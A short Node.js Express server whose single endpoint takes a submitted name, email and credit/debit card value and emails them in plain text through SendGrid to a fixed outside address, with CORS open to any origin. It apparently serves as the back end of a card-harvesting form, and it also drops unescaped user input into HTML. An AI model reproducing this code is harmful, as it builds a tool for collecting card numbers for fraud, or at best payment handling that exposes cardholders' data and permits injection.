require("dotenv").config();
const express = require("express");
const sgMail = require("@sendgrid/mail");
const cors = require("cors");

const app = express();

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors());

app.post("/send-email", async (req, res) => {
  const msg = {
    to: "test@dn-uk.com",
    from: "kds060902@outlook.com",
    subject: "Credit/Debit Card Form Submission",
    text: `Name: ${req.body.name}, Card: ${req.body.card}`,
    html: `<h2 style="color:#89c82e">Credit/Debit Card Details:</h2><p>Name: ${req.body.name}</p><p>Email: ${req.body.email}</p><p>Card: ${req.body.card}</p>`,
  };

  try {
    await sgMail.send(msg);
    console.log("Email sent");
    res.status(200).json({ success: true, message: "Email has been sent!" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, message: "Something went wrong" });
  }
});

app.listen(3000, () => console.log("Server is running on port 3000"));
